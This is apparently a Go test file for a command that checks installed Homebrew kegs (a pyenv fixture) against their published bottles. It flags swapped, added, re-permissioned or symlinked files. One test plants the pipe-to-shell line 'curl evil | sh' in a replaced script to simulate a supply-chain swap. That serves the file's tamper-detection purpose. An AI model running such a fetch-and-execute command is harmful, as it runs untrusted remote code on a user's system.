package cli

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func shaOf(s string) string { h := sha256.Sum256([]byte(s)); return hex.EncodeToString(h[:]) }

// kegFixture writes Cellar/pyenv/2.5.4 under a temp prefix and stubs the
// server: rebuild 0 is a different build, rebuild 1 is what was poured.
func kegFixture(t *testing.T, receipt string) (prefix, dir string, queries *[]string) {
	t.Helper()
	prefix = t.TempDir()
	dir = filepath.Join(prefix, "Cellar", "pyenv", "2.5.4")
	for p, body := range map[string]string{
		"libexec/pyenv":                         "#!/bin/bash\necho real pyenv\n",
		"share/pyenv.conf":                      "root=" + prefix + "\n",
		"INSTALL_RECEIPT.json":                  receipt,
		"sbom.spdx.json":                        "{}",
		".brew/pyenv.rb":                        "class Pyenv; end",
		"libexec/lib/__pycache__/x.cpython.pyc": "bytecode",
	} {
		os.MkdirAll(filepath.Dir(filepath.Join(dir, p)), 0o755)
		os.WriteFile(filepath.Join(dir, p), []byte(body), 0o755)
	}
	os.Symlink("../libexec/pyenv", filepath.Join(dir, "bin-pyenv"))
	var qs []string
	old := brewVerifyFetchVendor
	t.Cleanup(func() { brewVerifyFetchVendor = old })
	brewVerifyFetchVendor = func(query string, out any) error {
		qs = append(qs, query)
		q, _ := url.ParseQuery(query)
		m := map[string]any{"tag": q.Get("tag"), "rebuild": q.Get("rebuild")}
		switch q.Get("rebuild") {
		case "0":
			m["files"] = []map[string]any{{"path": "libexec/pyenv", "sha256": shaOf("#!/bin/bash\necho older build\n"), "exec": true}}
		case "1":
			m["files"] = []map[string]any{ // kegFixture writes every file 0755
				{"path": "libexec/pyenv", "sha256": shaOf("#!/bin/bash\necho real pyenv\n"), "exec": true},
				{"path": "share/pyenv.conf", "sha256": shaOf("root=@@HOMEBREW_PREFIX@@\n"), "subst_sha256": shaOf("root=" + prefix + "\n"), "exec": true},
				{"path": "bin-pyenv", "link": "../libexec/pyenv"},
				{"path": "sbom.spdx.json", "sha256": shaOf("bottle sbom"), "exec": true},
			}
		default:
			m = map[string]any{"unavailable": "no index", "missing": "index"}
		}
		b, _ := json.Marshal(m)
		return json.Unmarshal(b, out)
	}
	return prefix, dir, &qs
}

const pouredCore = `{"poured_from_bottle":true,"source":{"tap":"homebrew/core"}}`

func TestVerifyKegFindsThePouredRebuild(t *testing.T) {
	prefix, dir, qs := kegFixture(t, pouredCore)
	r, ok, extra := verifyKeg(prefix, dir, 15)
	if !ok || r.Tag != "arm64_sequoia.1" || extra != 1 {
		t.Fatalf("got %+v ok=%v extra=%d after %v", r, ok, extra, *qs)
	}
	// perl and java come from the bottle's tab on the server, never the receipt.
	if q := (*qs)[0]; strings.Contains(q, "perl=") || strings.Contains(q, "java=") || !strings.Contains(q, "tag=arm64_sequoia") {
		t.Errorf("first query %s", q)
	}
}

func TestVerifyKegReportsASwap(t *testing.T) {
	prefix, dir, _ := kegFixture(t, pouredCore)
	// The Binance shape: the formula's own script replaced in place.
	os.WriteFile(filepath.Join(dir, "libexec/pyenv"), []byte("#!/bin/bash\ncurl evil | sh\n"), 0o755)
	os.WriteFile(filepath.Join(dir, "libexec/helper"), []byte("dropped"), 0o755)
	r, ok, _ := verifyKeg(prefix, dir, 15)
	if ok || r.Reason == "" {
		t.Fatalf("swap verified: %+v", r)
	}
	got := strings.Join(r.Files, "\n")
	for _, want := range []string{"libexec/pyenv: content differs", "libexec/helper: not in the bottle"} {
		if !strings.Contains(got, want) {
			t.Errorf("missing %q in %v", want, r.Files)
		}
	}
	if strings.Contains(got, "sbom") || strings.Contains(got, "INSTALL_RECEIPT") || strings.Contains(got, ".pyc") {
		t.Errorf("pour artifacts reported: %v", r.Files)
	}
}

func TestVerifyKegNotAssessed(t *testing.T) {
	for _, c := range []struct {
		receipt string
		core    bool
		want    string
	}{
		{`{"poured_from_bottle":true,"source":{"tap":"someone/tap"}}`, false, "from tap someone/tap"},
		{`{"poured_from_bottle":false,"source":{"tap":"homebrew/core"}}`, false, "built from source"},
		{`not json`, false, "no readable INSTALL_RECEIPT.json"},
		// A receipt claiming a tap for a formula core has: the receipt
		// does not get to decide.
		{`{"poured_from_bottle":true,"source":{"tap":"someone/tap"}}`, true, "homebrew/core has pyenv, but publishes no bottle of 2.5.4"},
	} {
		prefix, dir, _ := kegFixture(t, c.receipt)
		brewVerifyFetchVendor = func(_ string, out any) error {
			b, _ := json.Marshal(map[string]any{"unavailable": "no index", "missing": "index", "core_formula": c.core})
			return json.Unmarshal(b, out)
		}
		r, ok, _ := verifyKeg(prefix, dir, 15)
		if ok || r.Files != nil || !strings.Contains(r.Reason, c.want) || r.coreUnbottled != c.core {
			t.Errorf("%s core=%v: %+v ok=%v", c.receipt, c.core, r, ok)
		}
	}
}

// The bottle's bytes with a changed exec bit are a changed file.
func TestVerifyKegExecBit(t *testing.T) {
	prefix, dir, _ := kegFixture(t, pouredCore)
	os.Chmod(filepath.Join(dir, "share/pyenv.conf"), 0o644)
	r, ok, _ := verifyKeg(prefix, dir, 15)
	if ok || !strings.Contains(strings.Join(r.Files, "\n"), "share/pyenv.conf: executable bit differs") {
		t.Fatalf("%+v ok=%v", r, ok)
	}
}

// Codex: a bottle directory swapped for a link to the user's own folder
// (holding identical bytes, edited later) must not verify, and an added
// symlink to a directory is never a post_install-shaped addition.
func TestVerifyKegSymlinkedDirectory(t *testing.T) {
	prefix, dir, _ := kegFixture(t, pouredCore)
	mine := t.TempDir()
	os.WriteFile(filepath.Join(mine, "pyenv"), []byte("#!/bin/bash\necho real pyenv\n"), 0o755)
	os.RemoveAll(filepath.Join(dir, "libexec"))
	os.Symlink(mine, filepath.Join(dir, "libexec"))
	os.Symlink(t.TempDir(), filepath.Join(dir, "share/extra"))
	r, ok, _ := verifyKeg(prefix, dir, 15)
	got := strings.Join(r.Files, "\n")
	if ok || !strings.Contains(got, "libexec/pyenv: reached through a symlinked directory") || !strings.Contains(got, "share/extra: symlink to a directory, not in the bottle") {
		t.Fatalf("ok=%v %v", ok, r.Files)
	}
	for _, h := range []string{"libexec/pyenv", "share/extra"} {
		found := false
		for _, x := range r.hard {
			found = found || x == h
		}
		if !found {
			t.Errorf("%s not a hard difference: %v", h, r.hard)
		}
	}
}
